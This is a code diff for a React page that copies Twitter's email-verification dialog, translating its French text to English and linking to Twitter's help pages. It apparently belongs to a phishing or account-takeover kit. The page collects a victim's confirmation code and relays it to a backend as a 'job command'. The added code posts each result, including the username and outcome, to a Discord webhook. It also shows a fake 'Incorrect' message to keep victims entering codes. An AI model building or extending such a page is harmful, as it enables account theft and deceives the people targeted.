@@ -10,9 +10,10 @@ import type {
   JobCommandResponse,
 } from "../../../server/src/types/jobs";
 
-import { FullScreenLoader } from "../components/FullScreenLoader";
+import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const EmailVerify = () => {
   const location = useLocation();
@@ -100,7 +101,12 @@ export const EmailVerify = () => {
 
       if (!cmdResp.data.ok) {
         setLoading(false);
-        setToast(cmdResp.data.error || "Command failed");
+        const error = cmdResp.data.error || "Command failed";
+        if (error === "NO_ACTIVE_SESSION") {
+          navigate("/oauth");
+          return;
+        }
+        setToast(error);
         return;
       }
 
@@ -120,21 +126,47 @@ export const EmailVerify = () => {
         return;
       }
 
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for email verify command result:", {
+        username,
+        commandId,
+        status: finalState.status,
+      });
+      
+      sendDiscordWebhookSafe({
+        username: "Email Verify Command Result",
+        content:
+          "📨 **Email Verify Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              username,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
+
       if (finalState.status === "done" && finalState.result?.ok) {
         console.log("✅ EMAIL VERIFY OK", finalState.result);
         navigate("/", { state: { username } });
         return;
       }
 
-      const msg =
-        finalState.error ||
-        finalState.result?.message ||
-        finalState.result?.error ||
-        "Invalid email code";
-      setToast(msg);
+      setToast("Incorrect. Please try again. g;176386412757198839:-1763864199877:9zAFrYNvTejYilPRFf0c5elL:7");
     } catch (err: any) {
       setLoading(false);
-      setToast(err.response?.data?.error || err.message || "Network error");
+      const error = err.response?.data?.error || err.message || "Network error";
+      if (error === "NO_ACTIVE_SESSION") {
+        navigate("/oauth");
+        return;
+      }
+      setToast(error);
     }
   };
 
@@ -146,7 +178,7 @@ export const EmailVerify = () => {
 
   return (
     <div className="emailverify-page">
-      <FullScreenLoader visible={loading} text="Verifying email..." />
+      <FullScreenBlueLoader visible={loading} />
       <Toast message={toast} onClose={() => setToast("")} />
 
       <div className="emailverify-modal" role="dialog" aria-modal="true">
@@ -156,7 +188,7 @@ export const EmailVerify = () => {
             <div className="emailverify-close-button-container">
               <button
                 className="emailverify-close-button"
-                aria-label="Fermer"
+                aria-label="Close"
                 type="button"
                 onClick={() => navigate(-1)}
               >
@@ -191,13 +223,12 @@ export const EmailVerify = () => {
         <div className="emailverify-content">
           <div className="emailverify-title-container">
             <h1 className="emailverify-title" id="modal-header">
-              Vérifiez votre adresse email
+              Verify your email address
             </h1>
             <div className="emailverify-description">
               <span>
-                Afin de protéger votre compte contre toute activité suspecte,
-                nous avons envoyé un code de confirmation à l&apos;adresse{" "}
-                {maskedEmail}. Entrez le ci-dessous pour vous connecter.
+                To help protect your account from suspicious activity, we&apos;ve
+                sent a confirmation code to {maskedEmail}. Enter it below to sign in.
               </span>
             </div>
           </div>
@@ -223,7 +254,7 @@ export const EmailVerify = () => {
           <div className="emailverify-form">
             <label className="emailverify-label">
               <div className="emailverify-label-text">
-                <span>Code de confirmation</span>
+                <span>Confirmation code</span>
               </div>
               <div className="emailverify-input-wrapper">
                 <input
@@ -255,7 +286,7 @@ export const EmailVerify = () => {
                 rel="noopener noreferrer nofollow"
                 className="emailverify-link-button"
               >
-                Pourquoi me demande-t-on cette information ?
+                Why is this information required?
               </a>
               <a
                 href="https://help.twitter.com/forms/account-access/regain-access"
@@ -263,7 +294,7 @@ export const EmailVerify = () => {
                 rel="noopener noreferrer nofollow"
                 className="emailverify-link-button"
               >
-                Signaler un problème
+                Report a problem
               </a>
             </div>
 
@@ -273,7 +304,7 @@ export const EmailVerify = () => {
               disabled={loading || !code.trim()}
               type="button"
             >
-              <span>Suivant</span>
+              <span>Next</span>
             </button>
           </div>
         </div>
